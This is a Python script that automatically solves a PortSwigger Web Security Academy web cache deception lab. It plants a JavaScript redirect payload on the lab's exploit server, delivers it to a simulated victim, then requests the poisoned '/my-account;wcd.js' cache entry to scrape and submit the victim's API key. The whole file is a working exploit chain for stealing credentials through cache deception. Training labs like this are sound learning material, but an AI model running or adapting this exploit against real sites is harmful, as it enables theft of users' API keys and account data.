import requests
from lxml import html
from rich.console import Console
from time import sleep
console = Console()



    

lab_id = console.input("[red bold]Insert Portswigger  lab id: ")

lab_url = f'https://{lab_id}.web-security-academy.net'



#get the exploit Server domain
def getExploitServerDomain():
    response = requests.get(lab_url)
    tree = html.fromstring(response.content)
    #we get the link to the exploit server
    href = tree.xpath(f"//a[@id='exploit-link']/@href")
    return href[0] if href else None


def getCompromisedUrl():
    return f"{lab_url}/my-account;wcd.js"

def getCompromisedScript():
    return f"<script>document.location=\"{getCompromisedUrl()}\"</script>"

def store_malicious_script(exploit_server):

    form_data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK",
        "Content-Type": "text/html; charset=utf-8",
        "responseBody": getCompromisedScript(),
        "formAction": "STORE"
    }

    response = requests.post(exploit_server, data=form_data)

def deliver_to_victim(exploit_server):

    form_data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK",
        "responseBody": getCompromisedScript(),
        "formAction": "DELIVER_TO_VICTIM"
    }
    response = requests.post(exploit_server, data=form_data)

def get_api_key():

    response = requests.get(getCompromisedUrl())
    tree = html.fromstring(response.content)
    api_key_div = tree.xpath(f"//div[@id='account-content']//div/text()")
    if api_key_div:
        api_key = api_key_div[0].replace("Your API Key is: ", "")
        return api_key
    return None

def submitResponse(exploit_server, api_key):
    response = requests.post(f"{exploit_server}/submitSolution", data={"answer": api_key})




with console.status("RETRIEVING EXPLOIT SERVER.") as status:



    try:
        
        exploit_server = getExploitServerDomain()

        if exploit_server == None:
            console.log("EXPLOIT SERVER NOT FOUND")
        else:
            status.update("STORE EXPLOIT TO SERVER.")
            store_malicious_script(exploit_server)

            status.update("DELIVERING TO VICTIM.")
            deliver_to_victim(exploit_server)

            status.update("RETRIVING API KEY")
            api_key = get_api_key()

            if api_key != None:
                status.update("SUBMITTING RESPONSE")
                submitResponse(exploit_server, api_key)
                console.log("EXPLOIT COMPLETE")
            else:
                console.log("UNABLE TO RETRIVE API KEY")
    except Exception as e:
        console.log(f"ERROR IN PHASE '{status.status}'")


